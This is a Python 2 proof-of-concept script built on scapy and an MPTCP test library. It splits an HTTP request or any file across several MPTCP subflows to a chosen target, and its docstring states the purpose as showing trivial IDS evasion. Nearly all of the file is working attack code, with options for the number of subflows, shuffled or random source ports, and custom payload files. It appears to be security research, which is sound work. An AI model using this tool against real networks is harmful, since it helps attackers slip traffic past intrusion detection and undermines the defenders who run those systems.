#!/usr/bin/env python2
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from tests.mptcptestlib import *
from _random import Random
from Crypto.Random.random import shuffle
"""Fragment an HTTP request over multiple MPTCP flows to demonstrate the potential for trivial IDS evasion.

No params or -h for help.

Example usage:
# python mptcp_fragment_http.py 192.168.88.165

Default number of flows is 5, and the request is split evenly over all flows.
"""

#TODO: Add port randomisation (with availability checking)
#TODO: Speed up opening flows (faster polling - or an option to set delay?)
def main(target, tgt_port, src_ip, nsubflows, path, first_src_port, payloadFile, portShuffled, randomSrcPorts):
    conf = {"printanswer":False, "debug":1, "check": False}
    t = ProtoTester(conf)
    s = MPTCPState()
    m = MPTCPTest(tester=t, initstate=s)
    timeout = .3
    fileBufferSize = 1024

    if not randomSrcPorts:
        ports = range(first_src_port, first_src_port + nsubflows)
    else:
        ports = [random.randrange(1,65534) for i in range(nsubflows)]

    if portShuffled:
        shuffle(ports)
    
    t.toggleKernelHandling(src_ip, enable=False)
    try:
        #TODO:s abstract this into a function
        firstSubflow = True
        for port in ports:
            print "Opening connection from port", port
            if firstSubflow:
                conn_open = [m.CapSYN, m.Wait, m.CapACK]
                firstSubflow=False
            else:
                conn_open = [m.JoinSYN, m.Wait, m.JoinACK]
            sub = s.registerNewSubflow(dst=target, src=src_ip, dport=tgt_port, sport=port)
            t.sendSequence(conn_open, initstate=s, sub=sub, waitAck=True,timeout=timeout)

        print "Splitting payload across", len(ports), "subflows"
        if not payloadFile:
            payload = "GET {} HTTP/1.1 \r\nHost: {}\r\n\r\n".format(path, target)
            snt = m.send_data(s=s, data=path, waitAck=True, timeout=timeout)

        else:
            f = open(payloadFile)
            for data in read_file_chunks(f, fileBufferSize):
                snt = m.send_data(s=s, data=data, waitAck=True, timeout=timeout)

        #This acks data on every subflow 20 times
        #TODO: Abstract this into a function
        for i in range(1, 5):
            j = 0
            for sflow in s.sub:
                #print "Subflow ", j, " cycling..."
                ackDss=[m.DSSACK]
                t.sendSequence(ackDss, initstate=s, sub=sflow,waitAck=True, timeout=timeout)
                j += 1
            #print " ------- Heartbeat Number", str(i)

        j = 0
        for sflow in s.sub:
            data_fin = [m.DSSFIN, m.DSSACK]
            t.sendSequence(data_fin, initstate=s, sub=sflow, waitAck=True, timeout=timeout)
            print "Subflow", j, "closed FIN"
            j += 1

    except PktWaitTimeOutException:
        print("Waiting has timed out, test exiting with failure")
        sys.exit(1)
    except IOError:
        print("IO Error Occured - Does file exist?")
    finally:
        t.toggleKernelHandling(src_ip, enable=True) # or manually with iptables -X  && iptables -F


def read_file_chunks(fileObj, chunkSize = 1024):
    while True:
        data = fileObj.read(chunkSize)
        if not data:
            break
        yield data


def get_local_ip_address(target):
    """Return the the IP address suitable for the target (ip or host)

    This appears to be the best cross platform approach using only
    the standard lib. Better ideas welcome.
    """
    #TODO: handle err if no suitable IP
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((str(target), 8000))
    ipaddr = s.getsockname()[0]
    s.close()
    return ipaddr


def parse_args():
    import argparse
    import itertools
    import sys

    parser = argparse.ArgumentParser(description='Fragment an HTTP request over multiple MPTCP flows.  '
                                                 'Requires root privileges for scapy.')
    parser.add_argument("--ip", action="store", dest="src_ip", help="use the specified source IP for all traffic")
    parser.add_argument('target', action="store", help=' Target IP')
    parser.add_argument('-p', '--port', action="store", type=int, help='target port', default=80)
    parser.add_argument("-n", '--nsubflows', action="store", type=int, help='Number of subflows to create', default=5)
    parser.add_argument('--first_src_port', action="store", type=int, help='First of nsubflows src ports', default=1001)
    parser.add_argument('--path', action="store", help='Path to request', default="/neodemopayload")
    parser.add_argument('--file', action="store", help='File to send instead of a payload', default=None)
    parser.add_argument('--shuffle', action="store", help='Shuffle the port order', default=False)
    parser.add_argument('--random_src_ports', action="store", help='use random ports', default=False)

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()
    args.src_ip = args.src_ip if args.src_ip else get_local_ip_address(args.target)
    return args.target, args.port, args.src_ip, args.nsubflows, args.path, args.first_src_port, args.file, args.shuffle, args.random_src_ports


if __name__ == "__main__":
    target, port, src_ip, nsubflows, path, first_src_port, payloadFile, portShuffled, randomSrcPorts = parse_args()
    main(target, port, src_ip, nsubflows, path, first_src_port, payloadFile, portShuffled, randomSrcPorts)
# vim: set ts=4 sts=4 sw=4 et:
